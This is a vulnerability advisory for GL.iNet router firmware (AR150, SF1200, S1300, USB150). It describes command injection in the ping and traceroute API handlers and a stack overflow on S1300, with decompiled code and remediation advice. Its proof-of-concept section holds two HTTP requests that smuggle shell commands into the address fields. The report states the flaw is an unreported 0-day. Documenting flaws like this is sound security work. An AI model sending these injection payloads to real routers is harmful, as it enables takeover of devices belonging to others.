# GL.iNet AR150 3.216 was discovered to contain an authenticated command injection vulnerability in the ping and traceroute API

## Overview

- Vendor: GL.iNet
- Product: AR150 3.216, SF1200 3.218, S1300 3.218, USB150 3.218
- Version: 3.216 / 3.218
- Component: /www/api FastCGI, /internet/ping and /internet/traceroute
- Vulnerability Class: CWE-78 command injection
- CVSS 3.1 (tentative): 8.8 High `AV:A/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` (9.8 if the diagnostic endpoint is reachable without a token)
- Manufacturer: https://www.gl-inet.com/

## Affected versions

- `openwrt-ar150-3.216-0321-1679391237.bin`.
- `/www/api`.
- `/www/cgi-bin/api`.
- `openwrt-sf1200-3.218-0709-1720518095.bin`.
  SF1200 `/www/api`.
  IDA of SF1200 `sub_408978` shows the same `ping_addr` ->
  `snprintf("ping '%s' ...")` -> `system()` and `trace_addr` ->
  `traceroute ... -n %s` -> `system()` code, so SF1200 is an additional
  affected model, not a duplicate report.
- `qsdk-s1300-3.218-0726-1721958248.img`.
  SquashFS at `0x3C137C`; `/www/cgi-bin/api`.
  IDA `sub_16D0C`/`sub_16E18` show the same `ping_addr`/`trace_addr`
  handlers, but using `sprintf` into `char v7[256]`, so S1300 is also
  affected by a stack buffer overflow with a long address.
- `openwrt-usb150-3.218-0709-1720515319.bin`.
  SquashFS/xz at `0x1D0000`; `/www/api`.
  IDA `sub_4073D4`/`sub_4074E8` are the same `ping_addr`/`trace_addr`
  handlers with a bounded 256-byte format call and explicit length
  check; USB150 is an additional affected model for the injection, not
  an overflow.
- `lighttpd.conf`: `/api` FastCGI -> `/www/api` over `/tmp/api.socket`;
  `/cgi-bin/` CGI.

## Vulnerability details

The API exposes `/internet/ping` and `/internet/traceroute`; the request
fields are `ping_addr` and `trace_addr`.

IDA resolves `0x44c0d8` to `system`, `0x44c0dc` to `gjson_get_string`,
and `0x44c0e0` to `snprintf`.

`sub_4073D4` (ping):

```c
v6 = gjson_get_string(req, "ping_addr");
snprintf(buf, 256, "ping '%s' -c4  > /tmp/ping_result 2>&1", v6);
system(buf);
```

`sub_4074E8` (traceroute):

```c
v6 = gjson_get_string(req, "trace_addr");
snprintf(buf, 256,
         "traceroute -4 -q 1 -w 1 -n %s > /tmp/trace_result 2>&1", v6);
system(buf);
```

No validation, quoting, or metacharacter filtering occurs before
`system`. Ping's single quotes can be broken with `'`; traceroute is
unquoted, so `;`/`|` is executed directly.

S1300 3.218 has the same sinks with an unbounded `sprintf`:

```c
char v7[256];
sprintf(v7, "ping '%s' -c4  > /tmp/ping_result 2>&1", string);
system(v7);
sprintf(v7, "traceroute -4 -q 1 -w 1 -n %s > /tmp/trace_result 2>&1", string);
system(v7);
```

A long `ping_addr`/`trace_addr` overflows `v7` in addition to the shell
injection.

## PoC

```http
POST /api/internet/traceroute HTTP/1.1
Host: <router>
Content-Type: application/json
Authorization: <valid token if required>

{"trace_addr":"127.0.0.1;id>/tmp/gl_pwned;#"}
```

```http
POST /api/internet/ping HTTP/1.1
Host: <router>
Content-Type: application/json
Authorization: <valid token if required>

{"ping_addr":"127.0.0.1';id>/tmp/gl_pwned;#"}
```

## Evidence

Static IDA decompilation, function-pointer resolution, endpoint/command
strings, lighttpd config and hashes:
`experiments/vulnerability-triage/results/20261108-glinet-ar150-ping-cmdi-01/evidence/`
(`static-ping-traceroute-handlers.txt`, `static-function-pointers.txt`,
`command-strings.txt`, `vendor-lighttpd.conf`, `hashes.txt`).

S1300 evidence:
`experiments/vulnerability-triage/results/20261108-glinet-s1300-ping-cmdi-01/`
(`static-s1300-ping-traceroute-decompile.txt`, `hashes.txt`).

USB150 evidence:
`experiments/vulnerability-triage/results/20261108-glinet-usb150-ping-cmdi-01/`
(`static-usb150-ping-traceroute-decompile.txt`, `hashes.txt`).

No dynamic run: the FastCGI API requires the GL.iNet UCI/router state and
`/tmp/api.socket`.

## Impact

An authenticated web/API user can execute arbitrary shell commands on
the router. On S1300, a long address also overflows the 256-byte command
buffer, giving a stack memory-corruption primitive. The diagnostic tools
are standard management features; if a build exposes them before token
validation, the primitive is pre-auth.

## Remediation / known-CVE relation

- Use an argv-based executor and validate `ping_addr`/`trace_addr` as an
  IP or hostname; reject quotes, `;`, `|`, backticks, `$`, newline and
  whitespace.
- Require the authenticated admin token on both endpoints.
- NVD `GL.iNet AR150`/`GL-AR150` returns only CVE-2021-44148 (stored XSS).
  The SF1200 3.218, S1300 3.218 and USB150 3.218 runs were checked and
  are additional affected models for the same API sink; the S1300 build
  also adds the `sprintf` stack overflow.
  CVE-2019-6272/6275 (older AR300M-Lite), CVE-2022-42055 (GoodCloud), and
  CVE-2023-31472/31476 (pre-3.216 file write) are distinct. Candidate
  0-day; no CVE assigned and no vendor contact.

## Additional Information

```markdown
### Vendor
GL.iNet

### Product
AR150 3.216, SF1200 3.218, S1300 3.218, USB150 3.218

### Version or Commit
3.216 / 3.218

### Vulnerability Class
CWE-78 command injection

### Description
The /api/internet/ping and /api/internet/traceroute handlers pass ping_addr and trace_addr into system() command strings. Ping quotes the value with single quotes, but traceroute does not; an authenticated attacker can inject commands. S1300 also overflows a 256-byte buffer with a long address.

### Affected_component
/www/api FastCGI, /internet/ping and /internet/traceroute

### Attack_vector
Authenticated JSON POST to /api/internet/ping or /api/internet/traceroute with a crafted address.

### Product_version
AR150 3.216, SF1200 3.218, S1300 3.218, USB150 3.218 3.216 / 3.218

### Reference
- https://www.gl-inet.com/
- https://github.com/vuln-1/vuln/blob/main/GL.iNet/AR150_V3.216/report-1.md
```
